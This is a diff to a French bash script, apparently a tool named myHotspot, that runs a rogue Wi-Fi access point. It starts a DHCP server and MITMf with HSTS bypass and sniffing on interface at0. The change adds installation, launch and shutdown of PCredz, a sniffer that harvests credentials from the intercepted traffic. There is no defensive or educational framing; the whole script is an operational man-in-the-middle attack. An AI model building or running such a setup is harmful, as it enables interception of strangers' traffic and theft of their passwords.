@@ -7,7 +7,7 @@ if [[ $EUID -ne 0 ]]; then
   exit 1
 fi
 
-#Initialisation paramètres console
+# Initialisation paramètres console
 txtrst="\e[0m"  #Réinitialisation du texte, blanc
 warn="\e[0;31m" #Alerte, rouge
 q="\e[0;32m"    #Question, vert
@@ -15,8 +15,8 @@ info="\e[0;33m" #Info, jaune
 
 init_fn() {
 
-#Vérification des installations
-#DHCP
+# Vérification des installations
+# DHCP
 if [[ ! -x /usr/sbin/dhcpd ]];then
   echo -e "$info\n[$warn✘$info] isc-dhcp-server n'est pas installé !"
   sleep 1
@@ -30,7 +30,7 @@ if [[ ! -x /usr/sbin/dhcpd ]];then
 else
 echo -e "$info\n[$q✔$info] isc-dhcp-server installé"
 fi
-#MITMf
+# MITMf
 if [[ ! -x /etc/MITMf ]];then
   echo -e "$info\n[$warn✘$info] MITMf n'est pas installé !"
   sleep 1
@@ -57,8 +57,32 @@ else
   cd /etc/myHotspot
   echo -e "$info[$q✔$info] Mise à jour de MITMf terminée"
 fi
+# PCredz
+if [[ ! -x /etc/PCredz ]];then
+  echo -e "$info\n[$warn✘$info] PCredz n'est pas installé !"
+  sleep 1
+  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)$txtrst"
+  read var
+  if [[ $var == y ]];then
+    cd /etc
+    git clone https://github.com/byt3bl33d3r/PCredz.git
+    apt-get install python python-libpcap
+    sleep 1
+    echo -e "$info\n[$q✔$info] Installation terminée$txtrst"
+  else
+    exit_fn
+  fi
+else
+  echo -e "$info[$q✔$info] PCredz installé"
+  sleep 1
+  echo -e "$info\n[$q+$info] Mise à jour de PCredz$txtrst"
+  cd /etc/PCredz
+  git pull
+  cd /etc/myHotspot
+  echo -e "$info[$q✔$info] Mise à jour de PCredz terminée"
+fi
 
-#Mise à jour
+# Mise à jour
 echo -e "$info\n[$q+$info] Mise à jour de myHotspot$txtrst"
 git pull
 echo -e "$info[$q✔$info] Mise à jour de myHotspot terminée$txtrst"
@@ -153,6 +177,13 @@ python mitmf.py -i at0 --hsts -f -k --sniffer -a & mitmfid=$!
 cd /etc/myHotspot
 sleep 4
 
+# PCredz
+echo -e "$info\n[$q+$info] Configuration et démarrage de PCredz $warn"
+cd /etc/PCredz
+xterm -xrm '*hold: true' -geometry 75x20+1+400 -T PCredz -e ./Pcredz -i at0 & pcredzid=$!
+cd /etc/myHotspot
+sleep 2
+
 #Finalisation
 clear
 echo -e "$info[$q✔$info] Initialistion terminée $txtrst\n"
@@ -175,6 +206,8 @@ kill ${dhcpdid}
 echo -e "$info[$q✔$info] DHCP stoppé $warn\n"
 kill ${mitmfid}
 echo -e "$info[$q✔$info] MITMf stoppé $warn"
+kill ${pcredzid}
+echo -e "$info[$q✔$info] PCredz stoppé $warn"
 sleep 1
 echo "0" > /proc/sys/net/ipv4/ip_forward
 iptables -F
